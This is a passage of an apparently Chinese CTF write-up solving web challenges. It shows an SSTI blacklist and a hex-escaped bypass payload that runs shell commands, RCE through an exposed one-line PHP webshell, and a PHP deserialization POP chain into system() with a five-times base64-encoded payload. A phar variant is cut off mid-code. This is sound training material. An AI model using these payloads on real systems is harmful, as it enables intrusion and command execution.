class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="string">f&quot;500报错了，查询语句如下：</span></span><br><span class="line"><span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> error_message, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hinter</span>():</span><br><span class="line">    template=<span class="string">&quot;hint：</span></span><br><span class="line"><span class="string">有一个aazz路由，去那里看看吧，天命人!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">finder</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        source_code = f.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;</span></span><br><span class="line"><span class="string"><span class="subst">&#123;source_code&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>审计源码 黑名单</p>
<p><code>black_list=[&#39;lipsum&#39;,&#39;|&#39;,&#39;%&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;map&#39;,&#39;chr&#39;, &#39;value&#39;, &#39;get&#39;, &quot;url&quot;, &#39;pop&#39;,&#39;include&#39;,&#39;popen&#39;,&#39;os&#39;,&#39;import&#39;,&#39;eval&#39;,&#39;_&#39;,&#39;system&#39;,&#39;read&#39;,&#39;base&#39;,&#39;globals&#39;,&#39;_.&#39;,&#39;set&#39;,&#39;application&#39;,&#39;getitem&#39;,&#39;request&#39;, &#39;+&#39;, &#39;init&#39;, &#39;arg&#39;, &#39;config&#39;, &#39;app&#39;, &#39;self&#39;]</code></p>
<p>把{}ban了 但是天命和难违可以替换为</p>
<p>所以直接按照黑名单 打ssti就可</p>
<p>最后payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">天命((g[<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;op&#x27;</span>][<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;</span>](<span class="string">&#x27;o&#x27;</span><span class="string">&#x27;s&#x27;</span>))[<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;cat /t*&#x27;</span>))[<span class="string">&#x27;r&#x27;</span><span class="string">&#x27;ead&#x27;</span>]()难违</span><br></pre></td></tr></table></figure>

<h2 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a><strong>火眼辩魑魅</strong></h2><p>进去dirsearch扫描网站 看到robots.txt 访问得到很多路由 说是只有一个能到</p>
<p>直接到&#x2F;tgshell.php打rce即可</p>
<p>post传入· <code>shell=print \</code>cat &#x2F;t*`;&#96;</p>
<p><img src="/images/image-20250414134522190.png" alt="image-20250414134522190"></p>
<p>因为是一句话木马 也可以直接使用蚁剑连接 然后也可得到flag</p>
<h2 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a><strong>什么文件上传？</strong></h2><p>进去是文件上传 发现传什么都被ban 于是dirsearch了一下网站 robots.txt里有东西</p>
<p>[图片]</p>
<p>访问&#x2F;class.php 发现是是反序列化并且有漏洞点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">best64_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$study</span>=<span class="string">&quot;study&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;learn = <span class="string">&quot;learn&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;study-&gt;<span class="title function_ invoke__">hard</span>();     <span class="comment">//1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;did = <span class="string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;done = <span class="string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;done;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;doing))==<span class="number">666</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doing</span>();                 </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;doing-&gt;better;      <span class="comment">//2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;good=<span class="string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;good;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bad=<span class="string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;out-&gt;useful7) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is your future.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&quot;wow&quot;</span>]);     <span class="comment">//3</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;no = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;no;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="number">0</span>,-<span class="number">4</span>);</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">best64_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// You learn yesterday, you choose today, can you get to your future?</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>理一下大概的链子顺序 </p>
<p>yesterday::destruct（study&#x3D;new today）-&gt; today::__call（doing&#x3D;new future）-&gt; future::__tostring</p>
<p>然后post传入wow就可以进行命令执行 但是有个注意点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">best64_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">best64_decode</span>(<span class="variable">$data</span>));</span><br></pre></td></tr></table></figure>

<p>序列化后的数据还要base_encode 5次传入</p>
<p>pop链如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;study-&gt;doing = <span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250414133152637.png" alt="image-20250414133152637"></p>
<p>null替换为%00就行了 因为private属性的原因</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZ</span><br><span class="line">XUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBoa1QxSkhVbkZhVnpBMFpVWlJlV0</span><br><span class="line">pGZEd4aVZrcEtWbTB4TUdKR1ZYZGhlazVYVTBoQ01sUldWVFZqUms1eFVXMXNUbUpGY0haWGJGcFBVM</span><br><span class="line">nMxY2sxVVdtcFNSMUp4V2xjd05HVkdVWGxpUlhSb1RXdHNOVmxyYUZkWlYxWldZWHBPVjFOSVFqSlVW</span><br><span class="line">M00xWTBaT2RFMVhkRmhTYTJ3MFYxUkplRlp0UmxaUFdFWlVWMGhDVVZsdE5WTk9iRkY1WTBWYVQxSlV</span><br><span class="line">iSGRWTWpCNFlURmtSMU5ZYUZwTmFrWllXVEJrUzFkV1JuVlhiWEJPVFVSV00xWXhZM2hPUjBwR1lraE</span><br><span class="line">dhMU5JUWxGWlYzUnlaVVpSZVdKRmRGUldNR3cyVjFSS2ExZHJNWEpYYWtaVVZsZG9lbHBITVZOV1JrW</span><br><span class="line">jBUbGRHV0ZKclduVlhWbFpyVmpKV1YyTkdWbEJTUjJoaFdXMTBjbU5zVGxoalJFSnNZWHBzZUZWc2FH</span><br><span class="line">OVZSMFpXWTBoU1lWSnRhRlJVVm1SUFpFWmFkVmR0ZEZoU2ExcDNWa2h3UWsxRk5IbFVhbHBwVFRKb1Q</span><br><span class="line">xVnJZelZqUm1SMFRsWmtUbEl4U2xwVk1qRTBZVmRLVldGSVFsVmxhMFYzVkdwS1QwNXRTalpVYkVKb1</span><br><span class="line">ZsYzVORmRZY0V0V01rcFlWV3hvYTAweWFFdFpWelZUVlVaU05sUnJOVTloZWxVeVdXcEtjMkV4WkVaT</span><br><span class="line">1dFNVlZbFJXV0ZsNlFYaGpSazVWV2taV2FHSnNTVEpXUkVwM1lXczFjbUpJVmxkaWJrSm9WbXBHZG1W</span><br><span class="line">R2JISlZhelZvVmxSb00xUnJVbXRoYlZaMFQwaHdWVTF0ZUV4VVZtUk9aVlphZEUxWGRGZE5NazR6VlR</span><br><span class="line">Ga2QwMUdVWGRQU0hCVlZrWndVRnBYTURWalJuQkhZVVU1YVZKdVFqRldiVFZQVkRGVmQyRjZUbGRTTT</span><br><span class="line">BGM1dsZHpOV05XYkRaWGEzQnBZa1p2TWxZeWVHdFpWVEZZVTJ0V1dGWXllRkZVVlZKU1RURnJlbU5JV</span><br><span class="line">2s1TlJHeDNWVEp3UjJGck1YTlhibEpoVW0xUmVsUlVRbk5qVjFKR1QxWkNUazFFUVhsV1J6VjNaRzFH</span><br><span class="line">V0ZWc2JGVmlXR2hvV1cxNFlXVnNVWGRVYTNCUFRWWktlRnBGYUhkVlIwWjBWRlJLVkZaNlZsaGFWM2g</span><br><span class="line">zVjBaa2NWSnRiRk5TTTFKM1ZraHdRazFGTkhsVWFscHBaV3hLVVZsV1ZuWmxSbXcyVTJ4a2FWWXhTbG</span><br><span class="line">xhUkU1dlZHeEZkMkY2VGxkU00wRjNXbGR6TldOV2NEWlhhM0JwWWtadk1sWXllR3RaVlRGWVUydFdVM</span><br><span class="line">WRIYUV0WlZ6VlRWVVpTTmxSck5VOWhlbXhHV1dwS2MyRXhaRVpPV0U1WVlsUldXRmw2UVhoV1ZrNVlZ</span><br><span class="line">a1pDVGxKR1JYcFhWRTUzWkdzMVJrOVlRbFJoYTFweFZGZDRZV1JHY0VkYVJFNXNVbFJGTVZVeFVtdFd</span><br><span class="line">WMFoxVldwYVZVMXVRblZVYlhSelpGWmFkV05IUmxkTlZ6azBWMWQwVTFKck1VWmlTRVpyVWxSc1VWUl</span><br><span class="line">VRWGROYkZGM1ZXNWFhRll4U2xwV1J6RTBXVmRLYzFkdWNGVldiRXBYV1ZaVk5HUXdOVVZhUjNCc1lsU</span><br><span class="line">m5kMVpFU25OVE1ERllWRmhzVjJKVVJuSldhazVyVGtaU2RHSkZjRTlOVmtwNFdrVm9kMVZIUm5SWmVr</span><br><span class="line">cFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldWalpWTVdSM1RVWlJkMDlJY0ZWV1JuQlJWV3RqTldOR2N</span><br><span class="line">FZGhSVGxwVW01Q01WWnROVTlVYkZwSVdraENWV1ZyUlhkVWFrcFBUbTFLTmxWc1FtaFdWemswVjFod1</span><br><span class="line">MxWXlTbGhWYkdoclRUSm9VVlpVUW5KTk1WcElZMFJDYkdGNmJIaFhibkJoVTIxS2MxZHFXbGhpUjFKb</span><br><span class="line">1ZGWmtTMUpXVGxsYVJYQm9ZbXhLVVZaSWNFNWxSMVp5VDFoR1ZWWkdjRXRaYkZwTFpERmtjbFJyY0U5</span><br><span class="line">TlZrcDRXa1ZvZDFWSFJuTlNWRXBVVm5wR1ZGcEhNVXRrUmxwWVlrWkNUbEpHUlhwWGJYaHZWR3MxY2s</span><br><span class="line">xVVdtbE5iWGh5VlRCV2RrMVdUbGhqUkVKVlRVUm9ObFJWVVhkUVVUMDk=1111</span><br></pre></td></tr></table></figure>

<p>在传入wow&#x3D;cat &#x2F;flag即可</p>
<p><img src="/images/image-20250414134244095.png" alt="image-20250414134244095"></p>
<h2 id="什么文件上传？-复仇"><a href="#什么文件上传？-复仇" class="headerlink" title="什么文件上传？(复仇)"></a><strong>什么文件上传？(复仇)</strong></h2><p>漏洞利用点:phar协议流可被file_exists()函数直接触发 可以上传.avg文件</p>
<p>链子如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span 